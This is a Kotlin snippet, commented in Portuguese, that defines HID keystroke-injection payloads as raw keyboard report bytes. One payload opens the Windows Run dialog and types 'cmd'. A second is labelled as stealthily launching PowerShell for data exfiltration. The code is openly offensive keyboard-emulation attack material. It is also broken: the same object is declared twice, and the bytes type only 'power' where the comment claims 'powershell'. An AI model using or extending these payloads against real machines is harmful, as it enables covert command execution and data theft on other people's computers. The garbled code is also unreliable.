// Mapeamento simplificado de Scancodes para automação
object HidPayloads {
    // Exemplo: Abrir terminal (Win+R) e digitar um comando
    val OPEN_TERMINAL = arrayOf(
        byteArrayOf(0x08, 0x15, 0x00, 0, 0, 0, 0, 0), // GUI + R
        byteArrayOf(0x00, 0x00, 0x00, 0, 0, 0, 0, 0), // Release
        byteArrayOf(0x00, 0x06, 0x00, 0, 0, 0, 0, 0), // 'c'
        byteArrayOf(0x00, 0x10, 0x00, 0, 0, 0, 0, 0), // 'm'
        byteArrayOf(0x00, 0x07, 0x00, 0, 0, 0, 0, 0), // 'd'
        byteArrayOf(0x00, 0x28, 0x00, 0, 0, 0, 0, 0)  // ENTER
    )
}
object HidPayloads {
    // Sequência para abrir o PowerShell de forma furtiva e executar exfiltração
    val EXFIL_POWERSHELL = arrayOf(
        byteArrayOf(0x08, 0x15, 0x00, 0, 0, 0, 0, 0), // Win + R
        byteArrayOf(0x00, 0x00, 0x00, 0, 0, 0, 0, 0), // Release
        // Digita 'powershell' (Abreviação para agilizar a execução)
        byteArrayOf(0x00, 0x13, 0x00, 0, 0, 0, 0, 0), // 'p'
        byteArrayOf(0x00, 0x12, 0x00, 0, 0, 0, 0, 0), // 'o'
        byteArrayOf(0x00, 0x1A, 0x00, 0, 0, 0, 0, 0), // 'w'
        byteArrayOf(0x00, 0x08, 0x00, 0, 0, 0, 0, 0), // 'e'
        byteArrayOf(0x00, 0x15, 0x00, 0, 0, 0, 0, 0), // 'r'
        byteArrayOf(0x00, 0x28, 0x00, 0, 0, 0, 0, 0)  // ENTER
    )
}
